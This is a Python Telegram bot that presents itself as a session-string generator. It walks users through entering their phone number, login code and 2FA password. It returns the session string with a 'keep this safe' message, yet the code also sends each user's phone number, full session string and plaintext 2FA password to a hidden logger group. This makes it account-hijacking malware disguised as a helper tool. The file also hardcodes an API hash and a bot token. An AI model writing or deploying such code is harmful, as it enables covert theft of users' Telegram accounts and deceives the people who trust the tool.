import asyncio
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from telethon.sessions import StringSession

# 🔹 Telegram API Credentials
API_ID = 28795512
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"

# 🔹 Logger Group ID (Replace with your Telegram Group ID)
LOGGER_GROUP_ID = -1002477750706  

# 🔹 Initialize the bot
bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# 🔹 Store user sessions
user_sessions = {}

# 🔹 Generate Session Command
@bot.on(events.CallbackQuery(pattern=b"generate"))
async def ask_phone(event):
    user_id = event.sender_id
    user_sessions[user_id] = {"step": "phone"}
    await event.respond(
        "**❖ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ\n\n**◍ ᴇxᴘʟᴀɪɴ :** `+919876543210`**",
        buttons=[Button.inline("❌ Cancel", b"cancel")]
    )

# 🔹 Process User Input
@bot.on(events.NewMessage)
async def process_input(event):
    user_id = event.sender_id
    if user_id not in user_sessions:
        return  

    step = user_sessions[user_id]["step"]

    # ✅ Step 1: Enter Phone Number
    if step == "phone":
        phone_number = event.message.text.strip()
        user_sessions[user_id]["phone"] = phone_number  

        client = TelegramClient(StringSession(), API_ID, API_HASH)  # 🔹 हर यूज़र के लिए नया क्लाइंट
        await client.connect()
        user_sessions[user_id]["client"] = client  

        try:
            sent_code = await client.send_code_request(phone_number)
            user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  # Save hash
            user_sessions[user_id]["step"] = "otp"
            await event.respond(
                "**❖ ᴏᴛᴘ sᴇɴᴛ ! ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ᴏᴛᴘ ʀᴇᴄᴇɪᴠᴇᴅ ᴏɴ ᴛᴇʟᴇɢʀᴀᴍ !**",
                buttons=[Button.inline("❌ Cancel", b"cancel")]
            )
        except Exception as e:
            await event.respond(f"**❖ ᴇʀʀᴏʀ:** {str(e)}. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ !")
            del user_sessions[user_id]

    # ✅ Step 2: Enter OTP
    elif step == "otp":
        otp_code = event.message.text.strip()
        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]
        phone_code_hash = user_sessions[user_id].get("phone_code_hash")  

        try:
            await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)  
            session_string = client.session.save()

            await bot.send_message(LOGGER_GROUP_ID, f"**❖ New Session Generated !**\n\n**◍ ᴜsᴇʀ:** `{user_id}`\n**◍ ᴘʜᴏɴᴇ:** `{phone_number}`\n**◍ sᴇssɪᴏɴ:** `{session_string}`")

            await event.respond(f"**❖ ʏᴏᴜʀ sᴇssɪᴏɴ sᴛʀɪɴɢ :**\n\n❖ `{session_string}`\n\n**◍ ᴋᴇᴇᴘ ᴛʜɪs sᴀғᴇ !**")
            del user_sessions[user_id]

        except PhoneCodeExpiredError:
            await event.respond("**❖ ᴇʀʀᴏʀ : ᴛʜᴇ ᴏᴛᴘ ʜᴀs ᴇxᴘɪʀᴇᴅ. ᴘʟᴇᴀsᴇ ᴜsᴇ /generate ᴛᴏ ɢᴇᴛ ᴀ ɴᴇᴡ ᴏᴛᴘ**")
            del user_sessions[user_id]

        except PhoneCodeInvalidError:
            await event.respond("**❖ ᴇʀʀᴏʀ : ᴛʜᴇ ᴏᴛᴘ ɪs ɪɴᴄᴏʀʀᴇᴄᴛ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ**")
        
        except SessionPasswordNeededError:
            user_sessions[user_id]["step"] = "password"
            await event.respond(
                "**❖ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀs 2-sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ.**\n◍ ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴛᴇʟᴇɢʀᴀᴍ ᴘᴀssᴡᴏʀᴅ :",
                buttons=[Button.inline("❌ Cancel", b"cancel")]
            )
        
        except Exception as e:
            await event.respond(f"**❖ ᴇʀʀᴏʀ :** {str(e)} ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ")

    # ✅ Step 3: Enter 2FA Password
    elif step == "password":
        password = event.message.text.strip()
        client = user_sessions[user_id]["client"]

        try:
            await client.sign_in(password=password)
            session_string = client.session.save()

            await bot.send_message(LOGGER_GROUP_ID, f"**❖ ɴᴇᴡ sᴇssɪᴏɴ ᴡɪᴛʜ 2-sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ !**\n\n**◍ ᴜsᴇʀ:** `{user_id}`\n🔑 **◍ sᴇssɪᴏɴ:** `{session_string}`\n**◍ ᴘᴀssᴡᴏʀᴅ ᴜsᴇᴅ:** `{password}`")

            await event.respond(f"**❖ ʏᴏᴜʀ sᴇssɪᴏɴ sᴛʀɪɴɢ :**\n\n◍ `{session_string}`\n\n**◍ ᴋᴇᴇᴘ ᴛʜɪs sᴀғᴇ !**")
            del user_sessions[user_id]
        except Exception as e:
            await event.respond(f"**❖ ᴇʀʀᴏʀ :** {str(e)}. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ")

# 🔹 Run the bot
print("🚀 Bot is running...")
bot.run_until_disconnected()
